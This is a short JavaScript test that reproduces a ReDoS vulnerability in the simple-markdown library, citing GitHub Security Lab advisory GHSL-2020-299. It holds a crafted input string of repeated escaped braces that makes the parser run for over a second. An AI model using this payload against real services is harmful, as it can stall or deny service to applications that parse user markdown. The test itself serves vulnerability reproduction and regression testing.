//https://securitylab.github.com/advisories/GHSL-2020-299-redos-simple-markdown/
test("ReDos in simple-markdown", () => {

    const genstr = require("./utils").genstr;
    const measureTime = require("./utils").measureTime;
    const SimpleMarkdown = require("simple-markdown");
    const mdParse = SimpleMarkdown.defaultBlockParse;
    
    let t =measureTime(function () {
        mdParse("~~\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\\\}\\}\\}\\}\\}\\}\\}}\\}\\}\\}\\}\\}\\}}~");
    });

    let time= t[0]+t[1]/1000000000;
    
    expect(time).toBeGreaterThan(1);

});